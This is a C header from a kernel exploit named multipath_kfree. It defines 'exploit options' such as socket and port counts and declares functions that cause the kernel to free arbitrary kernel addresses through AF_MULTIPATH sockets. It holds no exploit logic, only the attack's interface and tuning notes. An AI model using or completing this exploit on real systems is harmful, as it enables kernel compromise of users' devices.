//
//  multipath_kfree.c
//  multipath_kfree
//
//  Created by John Åkerblom on 6/1/18.
//

#include <stdint.h>

#ifndef AF_MULTIPATH
#define AF_MULTIPATH 39
#endif

#ifndef multipath_kfree_h
#define multipath_kfree_h


//Exploit options
#define MP_SOCK_COUNT 0x10
#define FIRST_PORTS_COUNT 100 //may be more stable with 200
#define REFILL_PORTS_COUNT 100 //may be more stable with 200
#define TOOLAZY_PORTS_COUNT 1000
#define REFILL_USERCLIENTS_COUNT 1000
#define MAX_PEEKS 30000

void multipath_exploit(void);

/* multipath_kfree: cause GC to free a kernel address. */
void multipath_kfree(uint64_t addr);

/* multipath_kfree_nearby_self: cause GC to free a "nearby" kernel address.
   NOTE: closes mp_sock */
void multipath_kfree_nearby_self(int mp_sock, uint16_t addr_lowest_part);

#endif
